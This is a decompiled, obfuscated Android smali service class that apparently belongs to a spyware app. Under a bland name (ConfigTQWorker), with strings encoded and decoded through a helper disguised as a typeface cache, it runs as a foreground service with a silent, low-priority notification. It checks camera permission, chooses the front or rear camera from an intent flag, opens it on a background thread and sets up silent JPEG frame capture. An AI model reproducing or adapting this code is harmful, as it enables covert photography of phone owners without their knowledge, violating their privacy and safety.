.class public final Lapp/mobilex/plus/services/ConfigTQWorker;
.super Landroid/app/Service;
.source "r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091"


# static fields
.field public static b1EoSIRjJHO5:J

.field public static volatile ibVTtJUNfrGYbW:[B


# instance fields
.field public Ee8d2j4S9Vm5yGuR:Z

.field public JXn4Qf7zpnLjP5:Landroid/os/Handler;

.field public dDIMxZXP1V8HdM:Landroid/hardware/camera2/CameraDevice;

.field public vekpFI4d1Nc4fakF:Landroid/os/HandlerThread;

.field public w9sT1Swbhx3hs:Landroid/media/ImageReader;

.field public final xDyLpEZyrcKVe0:Lv/s/ZSUCCvgkLgfCSFv;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    .line 1
    const-string v0, "000000790055008100F900B800E60096001400790049008C00F500AD"

    nop

    .line 2
    .line 3
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 4
    .line 5
    .line 6
    return-void
.end method

.method public constructor <init>()V
    .locals 1

    .line 1
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    .line 2
    .line 3
    .line 4
    new-instance v0, Lv/s/ZSUCCvgkLgfCSFv;

    .line 5
    .line 6
    invoke-direct {v0, p0}, Lv/s/ZSUCCvgkLgfCSFv;-><init>(Lapp/mobilex/plus/services/ConfigTQWorker;)V

    .line 7
    .line 8
    .line 9
    iput-object v0, p0, Lapp/mobilex/plus/services/ConfigTQWorker;->xDyLpEZyrcKVe0:Lv/s/ZSUCCvgkLgfCSFv;

    .line 10
    .line 11
    return-void
.end method

.method private static synthetic abnzefavyx()V
    .locals 1

    const-string v0, "Retry"

    const-string v0, "Error"

    const-string v0, "UTF-8"

    const-string v0, "ERROR"

    const-string v0, "Preferences"

    return-void
.end method


# virtual methods
.method public final dDIMxZXP1V8HdM()V
    .locals 2

    .line 1
    iget-object v0, p0, Lapp/mobilex/plus/services/ConfigTQWorker;->dDIMxZXP1V8HdM:Landroid/hardware/camera2/CameraDevice;

    .line 2
    .line 3
    if-eqz v0, :cond_0

    .line 4
    .line 5
    invoke-virtual {v0}, Landroid/hardware/camera2/CameraDevice;->close()V

    .line 6
    .line 7
    .line 8
    :cond_0
    const/4 v0, 0x0

    nop

    .line 9
    iput-object v0, p0, Lapp/mobilex/plus/services/ConfigTQWorker;->dDIMxZXP1V8HdM:Landroid/hardware/camera2/CameraDevice;

    .line 10
    .line 11
    iget-object v1, p0, Lapp/mobilex/plus/services/ConfigTQWorker;->w9sT1Swbhx3hs:Landroid/media/ImageReader;

    .line 12
    .line 13
    if-eqz v1, :cond_1

    .line 14
    .line 15
    invoke-virtual {v1}, Landroid/media/ImageReader;->close()V

    .line 16
    .line 17
    .line 18
    :cond_1
    iput-object v0, p0, Lapp/mobilex/plus/services/ConfigTQWorker;->w9sT1Swbhx3hs:Landroid/media/ImageReader;

    .line 19
    .line 20
    return-void
.end method

.method public final onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 0

    .line 1
    const/4 p1, 0x0

    .line 2
    return-object p1
.end method

.method public final onDestroy()V
    .locals 2

    .line 1
    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    .line 2
    .line 3
    .line 4
    invoke-virtual {p0}, Lapp/mobilex/plus/services/ConfigTQWorker;->dDIMxZXP1V8HdM()V

    .line 5
    .line 6
    .line 7
    iget-object v0, p0, Lapp/mobilex/plus/services/ConfigTQWorker;->vekpFI4d1Nc4fakF:Landroid/os/HandlerThread;

    .line 8
    .line 9
    if-eqz v0, :cond_0

    .line 10
    .line 11
    invoke-virtual {v0}, Landroid/os/HandlerThread;->quitSafely()Z

    .line 12
    .line 13
    .line 14
    :cond_0
    :try_start_0
    iget-object v0, p0, Lapp/mobilex/plus/services/ConfigTQWorker;->vekpFI4d1Nc4fakF:Landroid/os/HandlerThread;

    .line 15
    .line 16
    if-eqz v0, :cond_1

    .line 17
    .line 18
    invoke-virtual {v0}, Ljava/lang/Thread;->join()V

    .line 19
    .line 20
    .line 21
    goto/16 :goto_0

    .line 22
    :catch_0
    move-exception v0

    .line 23
    goto/16 :goto_1

    .line 24
    :cond_1
    :goto_0
    const/16 v0, 0x0

    nop

    nop

    .line 25
    iput-object v0, p0, Lapp/mobilex/plus/services/ConfigTQWorker;->vekpFI4d1Nc4fakF:Landroid/os/HandlerThread;

    .line 26
    .line 27
    iput-object v0, p0, Lapp/mobilex/plus/services/ConfigTQWorker;->JXn4Qf7zpnLjP5:Landroid/os/Handler;
    :try_end_0
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_0

    .line 28
    .line 29
    goto :goto_2

    .line 30
    :goto_1
    const-string v1, "003000620054009700D200BE00D100AC002400640054009200FE00BB00E600AF00310073005A008300B000BA00C000B5002C0064000100C7"

    .line 31
    .line 32
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 33
    .line 34
    .line 35
    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    .line 36
    .line 37
    .line 38
    :goto_2
    const-string v0, "000000790055008100F900B800E60096001400790049008C00F500AD009200A300260065004F009500FF00A600D700A3"

    .line 39
    .line 40
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 41
    .line 42
    .line 43
    return-void

    nop

    nop
.end method

.method public final onStartCommand(Landroid/content/Intent;II)I
    .locals 10

    .line 1
    const/4 p2, 0x2

    .line 2
    const/4 p3, 0x0

    .line 3
    const/4 v0, 0x0

    .line 4
    const/16 v1, 0x1

    .line 5
    :try_start_0
    const-string v2, "00200077005600B800E300B100D300B7"

    nop

    .line 6
    .line 7
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 8
    .line 9
    .line 10
    move-result-object v2

    .line 11
    const-class v3, Landroid/app/NotificationManager;

    .line 12
    .line 13
    invoke-virtual {p0, v3}, Landroid/content/Context;->getSystemService(Ljava/lang/Class;)Ljava/lang/Object;

    .line 14
    .line 15
    .line 16
    move-result-object v3

    .line 17
    check-cast v3, Landroid/app/NotificationManager;

    .line 18
    .line 19
    new-instance v4, Landroid/app/NotificationChannel;

    .line 20
    .line 21
    const-string v5, "0010006F0048009300F500B2"

    nop

    nop

    .line 22
    .line 23
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 24
    .line 25
    .line 26
    move-result-object v5

    .line 27
    invoke-direct {v4, v2, v5, v1}, Landroid/app/NotificationChannel;-><init>(Ljava/lang/String;Ljava/lang/CharSequence;I)V

    .line 28
    .line 29
    .line 30
    :goto_0
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    .line 31
    .line 32
    .line 33
    move-result-object v5

    .line 34
    invoke-virtual {v5}, Ljava/lang/Runtime;->maxMemory()J

    .line 35
    .line 36
    .line 37
    move-result-wide v5

    .line 38
    const-wide/16 v7, 0x0

    .line 39
    .line 40
    cmp-long v5, v5, v7

    .line 41
    .line 42
    if-gez v5, :cond_0

    nop

    nop

    .line 43
    .line 44
    invoke-static {}, Ljava/lang/Thread;->yield()V

    .line 45
    .line 46
    .line 47
    invoke-static {}, Ljava/lang/Thread;->yield()V

    .line 48
    .line 49
    .line 50
    goto/16 :goto_0

    .line 51
    :catch_0
    move-exception v2

    .line 52
    goto :goto_1

    .line 53
    :cond_0
    invoke-virtual {v4, p3}, Landroid/app/NotificationChannel;->setShowBadge(Z)V

    .line 54
    .line 55
    .line 56
    invoke-virtual {v4, v0, v0}, Landroid/app/NotificationChannel;->setSound(Landroid/net/Uri;Landroid/media/AudioAttributes;)V

    .line 57
    .line 58
    .line 59
    if-eqz v3, :cond_1

    .line 60
    .line 61
    invoke-virtual {v3, v4}, Landroid/app/NotificationManager;->createNotificationChannel(Landroid/app/NotificationChannel;)V

    .line 62
    .line 63
    .line 64
    :cond_1
    new-instance v3, Lv/s/s4Xe0OepSKbHpb3Nsd;

    .line 65
    .line 66
    invoke-direct {v3, p0, v2}, Lv/s/s4Xe0OepSKbHpb3Nsd;-><init>(Landroid/content/Context;Ljava/lang/String;)V

    .line 67
    .line 68
    .line 69
    iget-object v2, v3, Lv/s/s4Xe0OepSKbHpb3Nsd;->K7eEOBPYP9VIoHWTe:Landroid/app/Notification;

    nop

    .line 70
    .line 71
    const v4, 0x7f050021

    .line 72
    .line 73
    .line 74
    iput v4, v2, Landroid/app/Notification;->icon:I

    .line 75
    .line 76
    const/16 v2, -0x2

    .line 77
    iput v2, v3, Lv/s/s4Xe0OepSKbHpb3Nsd;->hjneShqpF9Tis4:I

    .line 78
    .line 79
    invoke-virtual {v3, p2, v1}, Lv/s/s4Xe0OepSKbHpb3Nsd;->vekpFI4d1Nc4fakF(IZ)V

    .line 80
    .line 81
    .line 82
    invoke-virtual {v3}, Lv/s/s4Xe0OepSKbHpb3Nsd;->dDIMxZXP1V8HdM()Landroid/app/Notification;

    .line 83
    .line 84
    .line 85
    move-result-object v2

    nop

    .line 86
    sget v3, Landroid/os/Build$VERSION;->SDK_INT:I

    .line 87
    .line 88
    const/16 v4, 0x1d

    .line 89
    .line 90
    if-lt v3, v4, :cond_2

    .line 91
    .line 92
    invoke-static {p0, v2}, Lv/s/JW3Lh9hxwLsO2ArTlH;->Qrz92kRPw4GcghAc(Lapp/mobilex/plus/services/ConfigTQWorker;Landroid/app/Notification;)V

    .line 93
    .line 94
    .line 95
    goto/16 :goto_2

    .line 96
    :cond_2
    const v3, 0x2333

    .line 97
    .line 98
    invoke-virtual {p0, v3, v2}, Landroid/app/Service;->startForeground(ILandroid/app/Notification;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 99
    .line 100
    .line 101
    goto :goto_2

    .line 102
    :goto_1
    const-string v3, "003300640054008A00FF00AB00D70081002C0064005E008000E200B000C700A90027002C001B"

    .line 103
    .line 104
    invoke-static {v3}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 105
    .line 106
    .line 107
    invoke-virtual {v2}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    .line 108
    .line 109
    .line 110
    :goto_2
    if-eqz p1, :cond_3

    .line 111
    .line 112
    const-string v2, "002500640054008900E4008000D100A6002E007300490086"

    nop

    nop

    .line 113
    .line 114
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 115
    .line 116
    .line 117
    move-result-object v2

    .line 118
    invoke-virtual {p1, v2, p3}, Landroid/content/Intent;->getBooleanExtra(Ljava/lang/String;Z)Z

    .line 119
    .line 120
    .line 121
    move-result p1

    .line 122
    goto :goto_3

    nop

    .line 123
    :cond_3
    move p1, p3

    .line 124
    :goto_3
    iput-boolean p1, p0, Lapp/mobilex/plus/services/ConfigTQWorker;->Ee8d2j4S9Vm5yGuR:Z

    .line 125
    .line 126
    const-string p1, "001700770050008E00FE00B8009200B7002B0079004F008800B000A800DB00B3002B0036"

    .line 127
    .line 128
    invoke-static {p1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 129
    .line 130
    .line 131
    const-string p1, "00630075005A008A00F500AD00D3"

    .line 132
    .line 133
    invoke-static {p1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 134
    .line 135
    .line 136
    const-string p1, "android.permission.CAMERA"

    .line 137
    .line 138
    invoke-static {p0, p1}, Lv/s/RIZfHbqXpth8r2yN4;->vekpFI4d1Nc4fakF(Landroid/content/Context;Ljava/lang/String;)I

    .line 139
    .line 140
    .line 141
    move-result v2

    .line 142
    if-eqz v2, :cond_4

    .line 143
    .line 144
    const-string p1, "000000770056008200E200BE009200B7002600640056008E00E300AC00DB00A8002D00360055008800E400FF00D500B500220078004F008200F4"

    .line 145
    .line 146
    invoke-static {p1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 147
    .line 148
    .line 149
    invoke-virtual {p0}, Landroid/app/Service;->stopSelf()V

    .line 150
    .line 151
    .line 152
    return p2

    .line 153
    :cond_4
    new-instance v2, Landroid/os/HandlerThread;

    .line 154
    .line 155
    const-string v3, "000000770056008200E200BE00F000A60020007D005C009500FF00AA00DC00A3"

    .line 156
    .line 157
    invoke-static {v3}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 158
    .line 159
    .line 160
    move-result-object v3

    .line 161
    invoke-direct {v2, v3}, Landroid/os/HandlerThread;-><init>(Ljava/lang/String;)V

    .line 162
    .line 163
    .line 164
    iput-object v2, p0, Lapp/mobilex/plus/services/ConfigTQWorker;->vekpFI4d1Nc4fakF:Landroid/os/HandlerThread;

    .line 165
    .line 166
    invoke-virtual {v2}, Ljava/lang/Thread;->start()V

    .line 167
    .line 168
    .line 169
    new-instance v2, Landroid/os/Handler;

    .line 170
    .line 171
    iget-object v3, p0, Lapp/mobilex/plus/services/ConfigTQWorker;->vekpFI4d1Nc4fakF:Landroid/os/HandlerThread;

    .line 172
    .line 173
    invoke-virtual {v3}, Landroid/os/HandlerThread;->getLooper()Landroid/os/Looper;

    .line 174
    .line 175
    .line 176
    move-result-object v3

    .line 177
    invoke-direct {v2, v3}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    .line 178
    .line 179
    .line 180
    iput-object v2, p0, Lapp/mobilex/plus/services/ConfigTQWorker;->JXn4Qf7zpnLjP5:Landroid/os/Handler;

    .line 181
    .line 182
    const-string v2, "camera"

    .line 183
    .line 184
    invoke-virtual {p0, v2}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    .line 185
    .line 186
    .line 187
    move-result-object v2

    nop

    .line 188
    check-cast v2, Landroid/hardware/camera2/CameraManager;

    .line 189
    .line 190
    :try_start_1
    iget-boolean v3, p0, Lapp/mobilex/plus/services/ConfigTQWorker;->Ee8d2j4S9Vm5yGuR:Z

    .line 191
    .line 192
    xor-int/2addr v1, v3

    nop

    nop

    .line 193
    invoke-virtual {v2}, Landroid/hardware/camera2/CameraManager;->getCameraIdList()[Ljava/lang/String;

    .line 194
    .line 195
    .line 196
    move-result-object v3

    .line 197
    array-length v4, v3

    .line 198
    move v5, p3

    .line 199
    :goto_4
    if-ge v5, v4, :cond_7

    .line 200
    .line 201
    aget-object v6, v3, v5

    nop

    .line 202
    .line 203
    invoke-virtual {v2, v6}, Landroid/hardware/camera2/CameraManager;->getCameraCharacteristics(Ljava/lang/String;)Landroid/hardware/camera2/CameraCharacteristics;

    .line 204
    .line 205
    .line 206
    move-result-object v7

    .line 207
    sget-object v8, Landroid/hardware/camera2/CameraCharacteristics;->LENS_FACING:Landroid/hardware/camera2/CameraCharacteristics$Key;

    .line 208
    .line 209
    invoke-virtual {v7, v8}, Landroid/hardware/camera2/CameraCharacteristics;->get(Landroid/hardware/camera2/CameraCharacteristics$Key;)Ljava/lang/Object;

    .line 210
    .line 211
    .line 212
    move-result-object v7

    .line 213
    check-cast v7, Ljava/lang/Integer;

    nop

    nop

    .line 214
    .line 215
    if-nez v7, :cond_5

    .line 216
    .line 217
    goto/16 :goto_5

    .line 218
    :cond_5
    invoke-virtual {v7}, Ljava/lang/Integer;->intValue()I

    .line 219
    .line 220
    .line 221
    move-result v7

    .line 222
    if-ne v7, v1, :cond_6

    .line 223
    .line 224
    goto/16 :goto_6

    .line 225
    :cond_6
    :goto_5
    add-int/lit8 v5, v5, 0x1

    .line 226
    .line 227
    goto/16 :goto_4

    .line 228
    :cond_7
    invoke-virtual {v2}, Landroid/hardware/camera2/CameraManager;->getCameraIdList()[Ljava/lang/String;

    .line 229
    .line 230
    .line 231
    move-result-object v1

    .line 232
    array-length v3, v1

    .line 233
    if-nez v3, :cond_8

    .line 234
    .line 235
    move-object v6, v0

    .line 236
    goto :goto_6

    .line 237
    :cond_8
    aget-object v6, v1, p3

    .line 238
    .line 239
    :goto_6
    if-nez v6, :cond_9

    .line 240
    .line 241
    const-string p1, "000000770056008200E200BE009200A9002C0062001B008100FF00AA00DC00A3"

    nop

    .line 242
    .line 243
    invoke-static {p1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 244
    .line 245
    .line 246
    invoke-virtual {p0}, Landroid/app/Service;->stopSelf()V

    .line 247
    .line 248
    .line 249
    goto :goto_a

    .line 250
    :catch_1
    move-exception p1

    nop

    nop

    .line 251
    goto :goto_9

    .line 252
    :cond_9
    invoke-virtual {v2, v6}, Landroid/hardware/camera2/CameraManager;->getCameraCharacteristics(Ljava/lang/String;)Landroid/hardware/camera2/CameraCharacteristics;

    .line 253
    .line 254
    .line 255
    move-result-object v1

    .line 256
    sget-object v3, Landroid/hardware/camera2/CameraCharacteristics;->SCALER_STREAM_CONFIGURATION_MAP:Landroid/hardware/camera2/CameraCharacteristics$Key;

    .line 257
    .line 258
    invoke-virtual {v1, v3}, Landroid/hardware/camera2/CameraCharacteristics;->get(Landroid/hardware/camera2/CameraCharacteristics$Key;)Ljava/lang/Object;

    .line 259
    .line 260
    .line 261
    move-result-object v1

    .line 262
    check-cast v1, Landroid/hardware/camera2/params/StreamConfigurationMap;

    .line 263
    .line 264
    const v3, 0x100

    .line 265
    .line 266
    if-eqz v1, :cond_a

    .line 267
    .line 268
    invoke-virtual {v1, v3}, Landroid/hardware/camera2/params/StreamConfigurationMap;->getOutputSizes(I)[Landroid/util/Size;

    .line 269
    .line 270
    .line 271
    move-result-object v0

    .line 272
    :cond_a
    const/16 v1, 0x280

    .line 273
    .line 274
    const v4, 0x1e0

    .line 275
    .line 276
    if-eqz v0, :cond_c

    .line 277
    .line 278
    array-length v5, v0

    .line 279
    :goto_7
    if-ge p3, v5, :cond_c

    .line 280
    .line 281
    aget-object v7, v0, p3

    nop

    nop

    .line 282
    .line 283
    invoke-virtual {v7}, Landroid/util/Size;->getWidth()I

    .line 284
    .line 285
    .line 286
    move-result v8

    .line 287
    const/16 v9, 0x500

    .line 288
    .line 289
    if-gt v8, v9, :cond_b

    .line 290
    .line 291
    invoke-virtual {v7}, Landroid/util/Size;->getHeight()I

    .line 292
    .line 293
    .line 294
    move-result v8

    .line 295
    const/16 v9, 0x2d0

    nop

    nop

    .line 296
    .line 297
    if-gt v8, v9, :cond_b

    .line 298
    .line 299
    invoke-virtual {v7}, Landroid/util/Size;->getWidth()I

    .line 300
    .line 301
    .line 302
    move-result v1

    .line 303
    invoke-virtual {v7}, Landroid/util/Size;->getHeight()I

    .line 304
    .line 305
    .line 306
    move-result v4

    .line 307
    goto/16 :goto_8

    .line 308
    :cond_b
    add-int/lit8 p3, p3, 0x1

    .line 309
    .line 310
    goto :goto_7

    nop

    .line 311
    :cond_c
    :goto_8
    invoke-static {v1, v4, v3, p2}, Landroid/media/ImageReader;->newInstance(IIII)Landroid/media/ImageReader;

    .line 312
    .line 313
    .line 314
    move-result-object p3

    .line 315
    iput-object p3, p0, Lapp/mobilex/plus/services/ConfigTQWorker;->w9sT1Swbhx3hs:Landroid/media/ImageReader;

    .line 316
    .line 317
    if-eqz p3, :cond_d

    .line 318
    .line 319
    new-instance v0, Lv/s/drzny1wQFcvLKP;

    .line 320
    .line 321
    const/16 v1, 0x0

    nop

    nop

    .line 322
    invoke-direct {v0, v1, p0}, Lv/s/drzny1wQFcvLKP;-><init>(ILjava/lang/Object;)V

    .line 323
    .line 324
    .line 325
    iget-object v1, p0, Lapp/mobilex/plus/services/ConfigTQWorker;->JXn4Qf7zpnLjP5:Landroid/os/Handler;

    .line 326
    .line 327
    invoke-virtual {p3, v0, v1}, Landroid/media/ImageReader;->setOnImageAvailableListener(Landroid/media/ImageReader$OnImageAvailableListener;Landroid/os/Handler;)V

    .line 328
    .line 329
    .line 330
    :cond_d
    invoke-static {p0, p1}, Lv/s/RIZfHbqXpth8r2yN4;->vekpFI4d1Nc4fakF(Landroid/content/Context;Ljava/lang/String;)I

    .line 331
    .line 332
    .line 333
    move-result p1

    .line 334
    if-nez p1, :cond_e

    nop

    .line 335
    .line 336
    iget-object p1, p0, Lapp/mobilex/plus/services/ConfigTQWorker;->xDyLpEZyrcKVe0:Lv/s/ZSUCCvgkLgfCSFv;

    .line 337
    .line 338
    iget-object p3, p0, Lapp/mobilex/plus/services/ConfigTQWorker;->JXn4Qf7zpnLjP5:Landroid/os/Handler;

    .line 339
    .line 340
    invoke-virtual {v2, v6, p1, p3}, Landroid/hardware/camera2/CameraManager;->openCamera(Ljava/lang/String;Landroid/hardware/camera2/CameraDevice$StateCallback;Landroid/os/Handler;)V
    :try_end_1
    .catch Landroid/hardware/camera2/CameraAccessException; {:try_start_1 .. :try_end_1} :catch_1

    .line 341
    .line 342
    .line 343
    goto :goto_a

    .line 344
    :goto_9
    const-string p3, "000000770056008200E200BE009200A600200075005E009400E300FF00D700B500310079004900DD00B0"

    .line 345
    .line 346
    invoke-static {p3}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 347
    .line 348
    .line 349
    invoke-virtual {p1}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    .line 350
    .line 351
    .line 352
    invoke-virtual {p0}, Landroid/app/Service;->stopSelf()V

    .line 353
    .line 354
    .line 355
    :cond_e
    :goto_a
    return p2
.end method
